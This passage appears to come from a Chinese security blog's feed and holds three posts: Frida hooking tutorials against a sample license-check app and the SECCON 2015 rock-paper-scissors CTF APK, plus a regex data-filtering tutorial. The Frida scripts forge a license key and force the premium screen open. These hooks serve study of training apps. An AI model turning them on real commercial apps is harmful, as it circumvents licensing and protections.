<h3 id="代码的构造与编写"><a href="#代码的构造与编写" class="headerlink" title="代码的构造与编写"></a>代码的构造与编写</h3><h3 id="hook-getMac-函数"><a href="#hook-getMac-函数" class="headerlink" title="hook getMac()函数"></a>hook getMac()函数</h3><p>getMac() 在showPremium函数中调用，showPremium在LauncherActivity类中，所有直接通过this就能直接调用getMac()方法</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">js_code = <span class="string">&#x27;&#x27;</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    Java.perform(function()&#123;</span></span><br><span class="line"><span class="string">        var hook_Activity = Java.use(&#x27;</span>de.fraunhofer.sit.premiumapp.LauncherActivity<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        hook_Activity.showPremium.implementation = function(v)&#123;</span></span><br><span class="line"><span class="string">            var Key = this.getKey();</span></span><br><span class="line"><span class="string">            var Mac = this.getMac();</span></span><br><span class="line"><span class="string">            send(Key);</span></span><br><span class="line"><span class="string">            send(Mac);</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;);</span></span><br><span class="line"><span class="string">&#x27;</span><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>完整的Python代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># -*-coding:utf-8-*-</span><br><span class="line">import frida, sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def on_message(message, data):</span><br><span class="line">    if message[&#39;type&#39;] &#x3D;&#x3D; &#39;send&#39;:</span><br><span class="line">        print(&quot;[*] &#123;0&#125;&quot;.format(message[&#39;payload&#39;]))</span><br><span class="line">    else:</span><br><span class="line">        print(message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hook_Activity &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);</span><br><span class="line">        hook_Activity.showPremium.implementation &#x3D; function(v)&#123;</span><br><span class="line">            var Key &#x3D; this.getKey();</span><br><span class="line">            var Mac &#x3D; this.getMac();</span><br><span class="line">            send(Key);</span><br><span class="line">            send(Mac);</span><br><span class="line"> </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br><span class="line"></span><br><span class="line">process &#x3D; frida.get_usb_device().attach(&#39;de.fraunhofer.sit.premiumapp&#39;)</span><br><span class="line">script &#x3D; process.create_script(js_code)</span><br><span class="line">script.on(&#39;message&#39;, on_message)</span><br><span class="line">script.load()</span><br><span class="line">sys.stdin.read()</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217210711185.png" alt="image-20201217210711185"></p>
<h3 id="计算密钥key"><a href="#计算密钥key" class="headerlink" title="计算密钥key"></a>计算密钥key</h3><p>接下来开始真正第一步的hook，将mac值与“LICENSEKEYOK”通过<code>MainActivity.xor</code>获取秘钥Key。那就直接hook <code>getKey</code>方法吧，这样可以自己来构造秘钥Key。<br>仔细分析，会发现在这一步中可能会遇到下面的问题：</p>
<ol>
<li>怎么调用xor方法。</li>
<li>java是强类型语言，javascript是弱类型语言，怎么将javascript参数进行类型转换并传递到java语言中。</li>
</ol>
<p>怎么将javascript参数进行类型转换并传递到java语言中？其实方法很简单，既然java是强类型语言，那就根据它要求的类型传递对应参数即可，看看它参数的类型。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static byte[] xor(byte[] val, byte[] key) &#123;</span><br><span class="line">    byte[] o &#x3D; new byte[val.length];</span><br><span class="line">    for (int i &#x3D; 0; i &lt; val.length; i++) &#123;</span><br><span class="line">        o[i] &#x3D; (byte) (val[i] ^ key[i % key.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>那么，在javascript代码中，先准备一个将字符串类型转换为byte[]类型的方法<code>stringToBytes</code>，再通过实例化<code>MainActivity</code>类的方式调用<code>xor()</code>，然后还需要一个将byte[]回转为String的方法，因为秘钥key是Sting类型的。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">js_code &#x3D; &#39;&#39;&#39;</span><br><span class="line">     &#x2F;&#x2F;字符串转换byte[]的方法</span><br><span class="line">     stringToBytes &#x3D; function(str) &#123; </span><br><span class="line">        var ch, st, re &#x3D; [];</span><br><span class="line">        for (var i &#x3D; 0; i &lt; str.length; i++ ) &#123;</span><br><span class="line">            ch &#x3D; str.charCodeAt(i); </span><br><span class="line">            st &#x3D; [];                </span><br><span class="line"> </span><br><span class="line">           do &#123; </span><br><span class="line">                st.push( ch &amp; 0xFF ); </span><br><span class="line">                ch &#x3D; ch &gt;&gt; 8;         </span><br><span class="line">            &#125;   </span><br><span class="line">            while ( ch ); </span><br><span class="line">            re &#x3D; re.concat( st.reverse() );</span><br><span class="line">        &#125; </span><br><span class="line">        return re; </span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;将byte[]转成String的方法</span><br><span class="line">     function byteToString(arr) &#123; </span><br><span class="line">        if(typeof arr &#x3D;&#x3D;&#x3D; &#39;string&#39;) &#123; </span><br><span class="line">            return arr; </span><br><span class="line">        &#125; </span><br><span class="line">        var str &#x3D; &#39;&#39;, </span><br><span class="line">            _arr &#x3D; arr; </span><br><span class="line">        for(var i &#x3D; 0; i &lt; _arr.length; i++) &#123; </span><br><span class="line">            var one &#x3D; _arr[i].toString(2), </span><br><span class="line">                v &#x3D; one.match(&#x2F;^1+?(?&#x3D;0)&#x2F;); </span><br><span class="line">            if(v &amp;&amp; one.length &#x3D;&#x3D; 8) &#123; </span><br><span class="line">                var bytesLength &#x3D; v[0].length; </span><br><span class="line">                var store &#x3D; _arr[i].toString(2).slice(7 - bytesLength); </span><br><span class="line">                for(var st &#x3D; 1; st &lt; bytesLength; st++) &#123; </span><br><span class="line">                    store +&#x3D; _arr[st + i].toString(2).slice(2); </span><br><span class="line">                &#125; </span><br><span class="line">                str +&#x3D; String.fromCharCode(parseInt(store, 2)); </span><br><span class="line">                i +&#x3D; bytesLength - 1; </span><br><span class="line">            &#125; else &#123; </span><br><span class="line">                str +&#x3D; String.fromCharCode(_arr[i]); </span><br><span class="line">            &#125; </span><br><span class="line">        &#125; </span><br><span class="line">        return str; </span><br><span class="line">    &#125;</span><br><span class="line">    &#x2F;&#x2F;hook 代码</span><br><span class="line">    Java.perform(function()&#123;</span><br><span class="line">        var hook_Activity &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.LauncherActivity&#39;);</span><br><span class="line">        var MainActivity &#x3D; Java.use(&#39;de.fraunhofer.sit.premiumapp.MainActivity&#39;)</span><br><span class="line">        var LicenseStr &#x3D; &quot;LICENSEKEYOK&quot;;</span><br><span class="line">        &#x2F;&#x2F;hook getKey()方法，直接构造密码，而不从preferences读取</span><br><span class="line">        hook_Activity.getKey.implementation &#x3D; function()&#123;</span><br><span class="line">            &#x2F;&#x2F;获取Mac</span><br><span class="line">            var Mac &#x3D; this.getMac();</span><br><span class="line">            &#x2F;&#x2F;实例化MainActivity</span><br><span class="line">            var instance &#x3D; MainActivity.$new();</span><br><span class="line">            &#x2F;&#x2F;类型转换</span><br><span class="line">            var MacByte &#x3D;stringToBytes(Mac);</span><br><span class="line">            var LicenseByte &#x3D; stringToBytes(LicenseStr);</span><br><span class="line"> </span><br><span class="line">            send(&quot;MacByte:&quot;+MacByte)</span><br><span class="line">            send(&quot;LicenseByte:&quot;+LicenseByte)</span><br><span class="line">            &#x2F;&#x2F;调用实例化对象的xor方法</span><br><span class="line">            xorResult &#x3D; instance.xor(MacByte,LicenseByte);</span><br><span class="line">            send(xorResult);</span><br><span class="line">            &#x2F;&#x2F;类型回转</span><br><span class="line">            var Key &#x3D; byteToString(xorResult)</span><br><span class="line">            send(Key);</span><br><span class="line">            return Key;</span><br><span class="line">        &#125;</span><br><span class="line">        hook_Activity.verifyClick.implementation &#x3D; function(view)&#123;</span><br><span class="line">            this.showPremium(view);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#39;&#39;&#39;</span><br></pre></td></tr></table></figure>

<p>接下来，执行看看，能不能获取秘钥Key。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201225155944497.png" alt="image-20201225155944497"></p>
<h3 id="调用showPremium获取答案"><a href="#调用showPremium获取答案" class="headerlink" title="调用showPremium获取答案"></a>调用showPremium获取答案</h3><p>前面2个步骤，可以说是已经完成90%了，接下来只需要在hook一个能够触发showPremium方法的即可。方法就随意了，这里采用hook verifyClick的方式，这样点击app上的<code>VERIFY</code>按钮，触发verifyClick方法去调用showPremium，进而获得最终答案。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hook_Activity.verifyClick.implementation &#x3D; function(view)&#123;</span><br><span class="line">      this.showPremium(view);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>启动脚本，点击app上的<code>VERIFY</code>按钮看看执行结果：</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201225160323712.png" alt="image-20201225160323712" style="zoom:50%;">

<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><blockquote>
<ol>
<li>任意类方法调用。</li>
<li>任意类方法重实现。<br>以及学会怎么构造和使用自定义javascript方法。</li>
</ol>
</blockquote>
<p>参考链接：</p>
<p><a href="https://bbs.pediy.com/thread-227233.htm">https://bbs.pediy.com/thread-227233.htm</a></p>
]]></content>
      <categories>
        <category>Android</category>
      </categories>
      <tags>
        <tag>Frida</tag>
        <tag>Hook</tag>
      </tags>
  </entry>
  <entry>
    <title>正则小技巧和数据过滤处理</title>
    <url>/2021/01/05/WEB/%E6%AD%A3%E5%88%99%E5%B0%8F%E6%8A%80%E5%B7%A7%E5%92%8C%E6%95%B0%E6%8D%AE%E8%BF%87%E6%BB%A4%E5%A4%84%E7%90%86/</url>
    <content><![CDATA[<h1 id="正则基础"><a href="#正则基础" class="headerlink" title="正则基础"></a>正则基础</h1><blockquote>
<p>首先讲一下正则的规则只需要管What How即可 其他无需考虑</p>
</blockquote>
<a id="more"></a>

<h2 id="匹配字符-What"><a href="#匹配字符-What" class="headerlink" title="匹配字符(What)"></a>匹配字符(What)</h2><ul>
<li><code>.</code></li>
<li><code>[abcd]</code> <code>[a-zA-Z]</code> <code>[^abcd]</code></li>
<li><code>\d</code> <code>\s</code> <code>\t</code> <code>\w</code> …</li>
</ul>
<h2 id="匹配数量-How"><a href="#匹配数量-How" class="headerlink" title="匹配数量(How)"></a>匹配数量(How)</h2><ul>
<li><code>*</code></li>
<li><code>+</code></li>
<li><code>?</code></li>
<li><code>&#123;n&#125;</code></li>
<li><code>&#123;n,&#125;</code></li>
<li><code>&#123;n,m&#125;</code></li>
</ul>
<h2 id="子匹配"><a href="#子匹配" class="headerlink" title="子匹配"></a>子匹配</h2><ul>
<li><code>()</code></li>
</ul>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><ul>
<li><code>a*</code> Greedy 贪婪</li>
<li><code>a*?</code> Lazy</li>
<li><code>|</code> 或</li>
<li><code>^</code> <code>$</code></li>
</ul>
<h1 id="用法1"><a href="#用法1" class="headerlink" title="用法1"></a>用法1</h1><p>使用数据如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">2	wangwei	200	false	false	791	true	</span><br><span class="line">8	wangjing	200	false	false	791	true	</span><br><span class="line">72	lihong	200	false	false	791	true	</span><br><span class="line">94	wangxin	200	false	false	791	true	</span><br><span class="line">107	liujuan	200	false	false	791	true	</span><br><span class="line">119	zhangbo	200	false	false	791	true	</span><br><span class="line">145	zhanghao	200	false	false	791	true	</span><br><span class="line">169	zhangbin	200	false	false	791	true	</span><br><span class="line">185	wangjing	200	false	false	791	true	</span><br><span class="line">224	liuxin	200	false	false	791	true	</span><br><span class="line">260	yanglin	200	false	false	790	true	</span><br><span class="line">354	likai	200	false	false	791	true	</span><br><span class="line">390	lixiang	200	false	false	791	true	</span><br><span class="line">435	zhangbo	200	false	false	791	true	</span><br><span class="line">436	wangxin	200	false	false	791	true	</span><br></pre></td></tr></table></figure>

<p>推荐一个网站</p>
<p><a href="https://regex101.com/">https://regex101.com/</a></p>
<p>打开进行正则匹配</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210427307.png" alt="image-20210105210427307" style="zoom:50%;">

<p>直接生成Python脚本</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210557490.png" alt="image-20210105210557490"></p>
<p>复制对应代码：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding&#x3D;utf8</span><br><span class="line"># the above tag defines encoding for this document and is for Python 2.x compatibility</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">regex &#x3D; r&quot;(\d+\s+)(\w+)(\s\d+\s\w+\s\w+\s\d+\s\w+)&quot;</span><br><span class="line"></span><br><span class="line">test_str &#x3D; (&quot;2  wangwei 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;8  wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;72 lihong  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;94 wangxin 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;107    liujuan 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;119    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;145    zhanghao    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;169    zhangbin    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;185    wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;224    liuxin  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;260    yanglin 200 false   false   790 true    \n&quot;</span><br><span class="line">    &quot;354    likai   200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;390    lixiang 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;435    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;436    wangxin 200 false   false   791 true    &quot;)</span><br><span class="line"></span><br><span class="line">matches &#x3D; re.finditer(regex, test_str, re.MULTILINE)</span><br><span class="line"></span><br><span class="line">for matchNum, match in enumerate(matches, start&#x3D;1):</span><br><span class="line">    </span><br><span class="line">    print (&quot;Match &#123;matchNum&#125; was found at &#123;start&#125;-&#123;end&#125;: &#123;match&#125;&quot;.format(matchNum &#x3D; matchNum, start &#x3D; match.start(), end &#x3D; match.end(), match &#x3D; match.group()))</span><br><span class="line">    </span><br><span class="line">    for groupNum in range(0, len(match.groups())):</span><br><span class="line">        groupNum &#x3D; groupNum + 1</span><br><span class="line">        </span><br><span class="line">        print (&quot;Group &#123;groupNum&#125; found at &#123;start&#125;-&#123;end&#125;: &#123;group&#125;&quot;.format(groupNum &#x3D; groupNum, start &#x3D; match.start(groupNum), end &#x3D; match.end(groupNum), group &#x3D; match.group(groupNum)))</span><br><span class="line"></span><br><span class="line"># Note: for Python 2.7 compatibility, use ur&quot;&quot; to prefix the regex and u&quot;&quot; to prefix the test string and substitution.</span><br></pre></td></tr></table></figure>

<p>修改为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># coding&#x3D;utf8</span><br><span class="line"># the above tag defines encoding for this document and is for Python 2.x compatibility</span><br><span class="line"></span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">regex &#x3D; r&quot;(\d+\s+)(\w+)(\s\d+\s\w+\s\w+\s\d+\s\w+)&quot;</span><br><span class="line"></span><br><span class="line">test_str &#x3D; (&quot;2  wangwei 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;8  wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;72 lihong  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;94 wangxin 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;107    liujuan 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;119    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;145    zhanghao    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;169    zhangbin    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;185    wangjing    200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;224    liuxin  200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;260    yanglin 200 false   false   790 true    \n&quot;</span><br><span class="line">    &quot;354    likai   200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;390    lixiang 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;435    zhangbo 200 false   false   791 true    \n&quot;</span><br><span class="line">    &quot;436    wangxin 200 false   false   791 true    &quot;)</span><br><span class="line"></span><br><span class="line">matches &#x3D; re.finditer(regex, test_str, re.MULTILINE)</span><br><span class="line"></span><br><span class="line">for i in matches:</span><br><span class="line">    print(i.group(2))</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210650979.png" alt="image-20210105210650979" style="zoom:50%;">

<h1 id="用法2"><a href="#用法2" class="headerlink" title="用法2"></a>用法2</h1><p>使用vim进行正则匹配</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:s&#x2F;abc&#x2F;def&#x2F;g 用def替换abc，g为global全局的意思</span><br><span class="line">%s&#x2F;200.*&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210939127.png" alt="image-20210105210939127" style="zoom:50%;">

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%s&#x2F;\(\d\+\s\)&#x2F;&#x2F;g</span><br></pre></td></tr></table></figure>

<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210105210951458.png" alt="image-20210105210951458" style="zoom:50%;">



<p>参考链接：</p>
<p><a href="https://regex101.com/">https://regex101.com/</a></p>
<p><a href="https://www.runoob.com/python/python-reg-expressions.html">https://www.runoob.com/python/python-reg-expressions.html</a></p>
<p><a href="https://www.cnblogs.com/penseur/archive/2011/02/25/1964522.html">https://www.cnblogs.com/penseur/archive/2011/02/25/1964522.html</a></p>
<p><a href="https://gist.github.com/JavaCS3/e36e494e78a02049950bfa7c7ebeb929">https://gist.github.com/JavaCS3/e36e494e78a02049950bfa7c7ebeb929</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>正则</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook框架Frida</title>
    <url>/2020/09/22/Android/frida/Hook%E6%A1%86%E6%9E%B6Frida/</url>
    <content><![CDATA[<h2 id="0x00-概述"><a href="#0x00-概述" class="headerlink" title="0x00 概述"></a>0x00 概述</h2><p>Frida是个轻量级别的hook框架</p>
<p><strong>是Python API，但JavaScript调试逻辑</strong></p>
<p>Frida的核心是用C编写的，并将<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fdevelopers.google.com%2Fv8%2F">Google的V8引擎</a>注入到目标进程中，在这些进程中，JS可以完全访问内存，挂钩函数甚至调用进程内的本机函数来执行。</p>
<p>使用Python和JS可以使用无风险的API进行快速开发。Frida可以帮助您轻松捕获JS中的错误并为您提供异常而不是崩溃。<br> 。<br> 关于frda学习路线了，Frida的学习还是蛮简单的，只需要了解两方面的内容：<br> 1）主控端和目标进程的交互（message）<br> 2）Python接口和js接口（查文档）</p>
<p>frida框架分为两部分：<br> 1）一部分是运行在系统上的交互工具frida CLI。<br> 2）另一部分是运行在目标机器上的代码注入工具 frida-serve。</p>
<a id="more"></a>



<h2 id="0x01-资源和环境"><a href="#0x01-资源和环境" class="headerlink" title="0x01 资源和环境"></a>0x01 资源和环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.7</span><br><span class="line">Google Nexus 6P Anroid 6.0.1</span><br><span class="line">Frida官网：https:&#x2F;&#x2F;www.frida.re&#x2F;</span><br><span class="line">Frida源码：https:&#x2F;&#x2F;github.com&#x2F;frida</span><br></pre></td></tr></table></figure>

<h2 id="0x02-运行模式"><a href="#0x02-运行模式" class="headerlink" title="0x02 运行模式"></a>0x02 运行模式</h2><p>Frida通过其强大的仪器核心Gum提供动态检测，Gum是用C语言编写的。因为这种检测逻辑很容易发生变化，所以通常需要用脚本语言编写，这样在开发和维护它时会得到一个简短的反馈循环。这就是GumJS发挥作用的地方。只需几行C就可以在运行时内运行一段JavaScript，它可以完全访问Gum的API，允许您挂钩函数，枚举加载的库，导入和导出的函数，读写内存，扫描模式的内存等</p>
<h2 id="0x03-Frida安装"><a href="#0x03-Frida安装" class="headerlink" title="0x03 Frida安装"></a>0x03 Frida安装</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install frida</span><br><span class="line">pip install frida-tools</span><br><span class="line">frida --version</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922142344067.png" alt="image-20200922142344067"></p>
<p>安卓端安装</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;frida&#x2F;frida&#x2F;releases</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922143332932.png" alt="image-20200922143332932"></p>
<p>看到我的cpu是armv8 64位的 所以对应的去下载相应的版本</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922143734995.png" alt="image-20200922143734995"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push frida-server-12.11.17-android-arm64 &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">cd &#x2F;data&#x2F;local&#x2F;tmp</span><br><span class="line">chmod 777 frida-server-12.11.17-android-arm64</span><br><span class="line">.&#x2F;frida-server-12.11.17-android-arm64</span><br></pre></td></tr></table></figure>

<p>在bash下frida-ps -U</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200922144633734.png" alt="image-20200922144633734"></p>
<h2 id="0x04-Hook示例的安装与分析"><a href="#0x04-Hook示例的安装与分析" class="headerlink" title="0x04 Hook示例的安装与分析"></a>0x04 Hook示例的安装与分析</h2><p>Frida官网给我们了一个ctf的示例，就以此为例子，开始学习frida在android逆向的使用。<br>rps.apk <a href="https://github.com/ctfs/write-ups-2015/raw/master/seccon-quals-ctf-2015/binary/reverse-engineering-android-apk-1/rps.apk">下载地址</a></p>
<p>使用虚拟机或者自己的手机将应用安装好，发现是一个简单的石头剪刀布的游戏应用，简单的玩了一下，没什么特别的，直接分析代码吧，看看到底想干什么。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923103121714.png" alt="image-20200923103121714"></p>
<h3 id="源代码分析"><a href="#源代码分析" class="headerlink" title="源代码分析"></a>源代码分析</h3><p>使用jadx-gui反编译，发现app没有加壳和混淆，当然一来就加壳和混淆的话对我们就太不友好了，接下分析就简单了，直接看java代码。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20200923103824726.png" alt="image-20200923103824726"></p>
<p>在MainActivity中找到OnCreate()方法，可以看到只是简单的声明了button控件以及对应的监听器。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected void onCreate(Bundle paramBundle) &#123;</span><br><span class="line">  super.onCreate(paramBundle);</span><br><span class="line">  setContentView(2130968600);</span><br><span class="line">  this.P &#x3D; (Button)findViewById(2131492941);</span><br><span class="line">  this.S &#x3D; (Button)findViewById(2131492943);</span><br><span class="line">  this.r &#x3D; (Button)findViewById(2131492942);</span><br><span class="line">  this.P.setOnClickListener(this);</span><br><span class="line">  this.r.setOnClickListener(this);</span><br><span class="line">  this.S.setOnClickListener(this);</span><br><span class="line">  this.flag &#x3D; 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续查看button的onclick方法，可以看出cpu是通过随机数组出的，其判断输赢的方法在this.showMessageTask中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void onClick(View paramView) &#123;</span><br><span class="line">   if (this.flag &#x3D;&#x3D; 1)</span><br><span class="line">     return; </span><br><span class="line">   this.flag &#x3D; 1;</span><br><span class="line">   ((TextView)findViewById(2131492946)).setText(&quot;&quot;);</span><br><span class="line">   TextView textView1 &#x3D; (TextView)findViewById(2131492944);</span><br><span class="line">   TextView textView2 &#x3D; (TextView)findViewById(2131492945);</span><br><span class="line">   this.m &#x3D; 0;</span><br><span class="line">   this.n &#x3D; (new Random()).nextInt(3);	&#x2F;&#x2F;随机数0，1，2</span><br><span class="line">   int i &#x3D; this.n;</span><br><span class="line">   (new String[3])[0] &#x3D; &quot;CPU: Paper&quot;;</span><br><span class="line">   (new String[3])[1] &#x3D; &quot;CPU: Rock&quot;;</span><br><span class="line">   (new String[3])[2] &#x3D; &quot;CPU: Scissors&quot;;</span><br><span class="line">   textView2.setText((new String[3])[i]);</span><br><span class="line">   if (paramView &#x3D;&#x3D; this.P) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Paper&quot;);</span><br><span class="line">     this.m &#x3D; 0;</span><br><span class="line">   &#125; </span><br><span class="line">   if (paramView &#x3D;&#x3D; this.r) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Rock&quot;);</span><br><span class="line">     this.m &#x3D; 1;</span><br><span class="line">   &#125; </span><br><span class="line">   if (paramView &#x3D;&#x3D; this.S) &#123;</span><br><span class="line">     textView1.setText(&quot;YOU: Scissors&quot;);</span><br><span class="line">     this.m &#x3D; 2;</span><br><span class="line">   &#125; </span><br><span class="line">   this.handler.postDelayed(this.showMessageTask, 1000L);	&#x2F;&#x2F;输赢判断方法</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>跟进分析showMessageTask，可以看到如果赢了mainActivity.cnt会+1，但是一旦输了cnt就会置0，而获取flag的要求是我们得获胜1000次，…… :(</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">private final Runnable showMessageTask &#x3D; new Runnable() &#123;</span><br><span class="line">    public void run() &#123;</span><br><span class="line">      TextView textView &#x3D; (TextView)MainActivity.this.findViewById(2131492946);</span><br><span class="line">      if (MainActivity.this.n - MainActivity.this.m &#x3D;&#x3D; 1) &#123;</span><br><span class="line">        MainActivity mainActivity &#x3D; MainActivity.this;</span><br><span class="line">        mainActivity.cnt++;</span><br><span class="line">        textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; else if (MainActivity.this.m - MainActivity.this.n &#x3D;&#x3D; 1) &#123;</span><br><span class="line">        MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">        textView.setText(&quot;LOSE +0&quot;);</span><br><span class="line">      &#125; else if (MainActivity.this.m &#x3D;&#x3D; MainActivity.this.n) &#123;</span><br><span class="line">        textView.setText(&quot;DRAW +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; else if (MainActivity.this.m &lt; MainActivity.this.n) &#123;</span><br><span class="line">        MainActivity.this.cnt &#x3D; 0;</span><br><span class="line">        textView.setText(&quot;LOSE +0&quot;);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        MainActivity mainActivity &#x3D; MainActivity.this;</span><br><span class="line">        mainActivity.cnt++;</span><br><span class="line">        textView.setText(&quot;WIN! +&quot; + String.valueOf(MainActivity.this.cnt));</span><br><span class="line">      &#125; </span><br><span class="line">      if (1000 &#x3D;&#x3D; MainActivity.this.cnt)</span><br><span class="line">        textView.setText(&quot;SECCON&#123;&quot; + String.valueOf((MainActivity.this.cnt + MainActivity.this.calc()) * 107) + &quot;&#125;&quot;); </span><br><span class="line">      MainActivity.this.flag &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;;</span><br></pre></td></tr></table></figure>

<p>简单分析一下获取flag需要的条件，总结有3个办法:</p>
<ol>
<li>分析calc()方法能算出答案，但这个方法在so中，得分析汇编代码才行，当然可以尝试使用ida pro，F5查看C代码分析，前提是算法不难。</li>
<li>获取calc函数的返回值，从而计算答案。</li>
<li>还有一个方法就是，直接将MainActivity.this.cnt的值构造成1000。</li>
</ol>
<p>接下来就用frida，使用后两种思路来解这个简单的示例。但在这之前得先了解Frida自带的Messages机制，了解frida怎么从通过一个python脚本发送和接收message消息是一个提升理解frida的好方法。</p>
<h2 id="0x04-Frida自带的Messages机制与进程交互"><a href="#0x04-Frida自带的Messages机制与进程交互" class="headerlink" title="0x04 Frida自带的Messages机制与进程交互"></a>0x04 Frida自带的Messages机制与进程交互</h2><p>先来看看一个Messages的模板，这里用到的语言分别是python和javascript，他们之间的关系是python作为载体，javascript作为在android中真正执行代码。</p>
